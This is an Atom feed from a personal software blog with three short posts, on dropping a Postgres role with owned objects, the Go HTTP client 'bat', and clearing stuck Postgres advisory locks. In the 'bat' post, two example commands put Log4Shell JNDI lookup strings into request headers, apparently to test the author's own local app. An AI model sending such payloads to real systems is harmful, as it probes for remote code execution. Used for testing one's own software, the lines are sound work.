<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-07T12:18:14-08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rando Software</title><subtitle>Personal rando software blog</subtitle><entry><title type="html">Quickly Drop Postgres User with Hundreds of Dependent Objects</title><link href="http://localhost:4000/postgres/db/2023/01/07/postgres_droping_user_with_owned_objects.html" rel="alternate" type="text/html" title="Quickly Drop Postgres User with Hundreds of Dependent Objects" /><published>2023-01-07T12:10:03-08:00</published><updated>2023-01-07T12:10:03-08:00</updated><id>http://localhost:4000/postgres/db/2023/01/07/postgres_droping_user_with_owned_objects</id><content type="html" xml:base="http://localhost:4000/postgres/db/2023/01/07/postgres_droping_user_with_owned_objects.html">&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;

&lt;p&gt;I recently needed to remove a user from our database and got the following error:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ERROR:  role &quot;old-baboon&quot; cannot be dropped because some objects depend on it
... &amp;lt;huge list of objects&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;These objects should never have been owned by this particular user in the first place 
and I knew which user should own them, but it was impractical to do them as one offs.
It ended up being pretty easy after doing some quick research:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reassign owned by old-baboon TO young-baboon; 
drop owned by old-baboon;
drop user old-baboon;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="postgres" /><category term="db" /><summary type="html">Background</summary></entry><entry><title type="html">BAT, Golang Http Client</title><link href="http://localhost:4000/http/golang/2023/01/06/bat-golang-http-client.html" rel="alternate" type="text/html" title="BAT, Golang Http Client" /><published>2023-01-06T09:10:03-08:00</published><updated>2023-01-06T09:10:03-08:00</updated><id>http://localhost:4000/http/golang/2023/01/06/bat-golang-http-client</id><content type="html" xml:base="http://localhost:4000/http/golang/2023/01/06/bat-golang-http-client.html">&lt;p&gt;A few days ago I need to to craft some non standard http requests and
send them to our web application. I’ve used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpie&lt;/code&gt; in the past, but wanted 
to try something different. Given that golang clients would have all the 
deps bundled I figured I’d check if there were any good projects on github. 
I found &lt;a href=&quot;https://github.com/astaxie/bat&quot;&gt;bat&lt;/a&gt; that was really easy to install 
and worked great. Turns out it was actually inspired by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpie&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;go install github.com/astaxie/bat@latest&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Then was off to the races:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat localhost:3000 User-Agent:&quot;\${jndi:ldap://log4shell-generic-HJRowHlwCKDBn2GuIMz7\${lower:ten}.w.nessus.org/nessus}&quot; Content-Type:application/html
bat localhost:3000 Content-Type:&quot;\${jndi:ldap://log4shell-generic-HJRowHlwCKDBn2GuIMz7\${lower:ten}.w.nessus.org/nessus}&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Will definitely be using this again in the future.&lt;/p&gt;</content><author><name></name></author><category term="http" /><category term="golang" /><summary type="html">A few days ago I need to to craft some non standard http requests and send them to our web application. I’ve used httpie in the past, but wanted to try something different. Given that golang clients would have all the deps bundled I figured I’d check if there were any good projects on github. I found bat that was really easy to install and worked great. Turns out it was actually inspired by httpie</summary></entry><entry><title type="html">Clearing Postgres Locks</title><link href="http://localhost:4000/postgres/db/2023/01/03/clearing-postgres-locks.html" rel="alternate" type="text/html" title="Clearing Postgres Locks" /><published>2023-01-03T14:07:03-08:00</published><updated>2023-01-03T14:07:03-08:00</updated><id>http://localhost:4000/postgres/db/2023/01/03/clearing-postgres-locks</id><content type="html" xml:base="http://localhost:4000/postgres/db/2023/01/03/clearing-postgres-locks.html">&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;

&lt;p&gt;Every once in a while I run into issues where a script that uses a Postgres
Advisory Lock crashes and the lock doesn’t get released. The script is run
via cron and since the Advisory Lock wasn’t properly released, the next time
the script starts up it fails to aquire the lock and pings our errbit system
and then shuts down. This will continue forever unless I manually clean up
the lock.&lt;/p&gt;

&lt;h2 id=&quot;the-clean-up-process&quot;&gt;The Clean up Process&lt;/h2&gt;
&lt;h3 id=&quot;view-a-specific-lock&quot;&gt;View A Specific Lock&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pg_locks&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lockid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RECORD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;------+----------------&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;locktype&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;advisory&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;database&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16401&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;relation&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tuple&lt;/span&gt;              &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;virtualxid&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;transactionid&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;classid&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;objid&lt;/span&gt;              &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1661777215&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;objsubid&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;virtualtransaction&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;132&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;                &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28843&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;mode&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExclusiveLock&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;granted&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fastpath&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;waitstart&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Among other things, we can see the pid of the process that initiated this lock: 28843&lt;/p&gt;

&lt;h3 id=&quot;stop-the-process&quot;&gt;Stop the Process&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pg_cancel_backend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28843&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;----------------------------------&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This problem with this method, is that it may or may not have worked. We actually
need to query pg_stat_activity to see if was actually shudown.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pg_stat_activity&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28843&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If the process is still running, we need to use a more forceful method:&lt;/p&gt;

&lt;h3 id=&quot;seriously-stop-the-process&quot;&gt;Seriously, Stop the Process!&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pg_terminatel_backend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28843&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;----------------------------------&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And now we can confirm that the lock has been released:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pg_locks&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lockid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;rows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The next time the script runs via cron it will successfully aquire the lock.&lt;/p&gt;</content><author><name></name></author><category term="postgres" /><category term="db" /><summary type="html">Background</summary></entry></feed>